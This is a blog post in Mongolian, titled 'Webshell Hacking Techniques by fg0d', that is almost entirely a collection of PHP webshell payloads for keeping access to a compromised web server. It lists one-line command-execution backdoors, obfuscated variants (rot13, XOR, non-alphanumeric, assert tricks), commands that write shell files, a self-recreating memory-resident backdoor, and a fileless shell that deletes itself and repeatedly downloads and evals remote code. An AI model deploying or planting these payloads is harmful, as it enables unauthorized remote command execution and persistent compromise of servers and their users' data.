---
published: true
---
## Webshell Hacking Techniques by fg0d

<p align="center">
<img src="https://raw.githubusercontent.com/fg0d/fg0d.github.io/master/photos/hackedd.jpg">
</p>

Веб аппликэйшнрүү довтолгоо хийх үеийн **Maintaining Access** хэсэгт **Webshell** -г ашигладаг бөгөөд энэ нь тухайн серверлүү алсын зайнаас хүссэн тушаалыг биелүүлэх боломжтой болгодог.

```php
<?php system($_GET["cmd"]); ?>
<?php system($_GET[1]); ?>
<?php system("`$_GET[1]`"); ?>
<?= system($_GET[cmd]);
<?php eval($_POST[cmd]);?>
<?php echo `$_GET[1]`;
<?php echo passthru($_GET['cmd']);
<?php echo shell_exec($_GET['cmd']);
<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
<script language="php">system("id"); </script>

<?php $_GET['a']($_GET['b']); ?>
// a=system&b=ls
// a=assert&b=system("ls")

<?php array_map("ass\x65rt",(array)$_REQUEST['cmd']);?>
// .php?cmd=system("ls")

<?@extract($_REQUEST);@die($f($c));?>
// .php?f=system&c=id

<?php @include($_FILES['u']['tmp_name']);  
<form action="http://x.x.x.x/shell.php" method="POST" enctype="multipart/form-data">

<?php $x=~¾¬¬º­«;$x($_GET['a']); ?>
// not backdoor (assert)
// .php?a=system("ls")

echo "{${phpinfo()}}";

echo "${system(ls)}";

echo Y2F0IGZsYWc= | base64 -d | sh
// Y2F0IGZsYWc=   =>  cat  flag гэсэн base64 шүү

echo -e "<?php passthru(\$_POST[1])?>;\r<?php echo 'A PHP Test ';" > shell.php
// cat shell.php
// <?php echo 'A PHP Test ';" ?>

echo ^<?php eval^($_POST['a']^); ?^> > a.php
// Windows echo Export a sentence

<?php fwrite(fopen("gggg.php","w"),"<?php system(\$_GET['a']);");

<?php
header('HTTP/1.1 404');
ob_start();
phpinfo();
ob_end_clean();
?>

<?php 
// No echo backdoor  
// e.g. ?pass=file_get_contents('http://kaibro.tw/test')
ob_start('assert');
echo $_REQUEST['pass'];
ob_end_flush();
?>

<?=
// Webshell without alphanumeric
$💩 = '[[[[@@' ^ '("(/%-';
$💩(('@@['^'#!/')." /????");

A=fl;B=ag;cat $A$B
```

## Webshell resident memory

```php
<?php
    ignore_user_abort(true);  // Ignore disconnection
    set_time_limit(0);  // Set no upper limit of execution time
    $file = 'shell.php';
    $code = '<?php eval($_POST[a]);?>';
    while(md5(file_get_contents($file)) !== md5($code)) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>

```

## Fileless webshell

```php
<?php  
    unlink(__FILE__);  
    ignore_user_abort(true);  
    set_time_limit(0);  
    $remote_file = 'http://xxx/xxx.txt';  
    while($code = file_get_contents($remote_file)){  
        @eval($code);  
        sleep(5);  
    };  

?>  
```
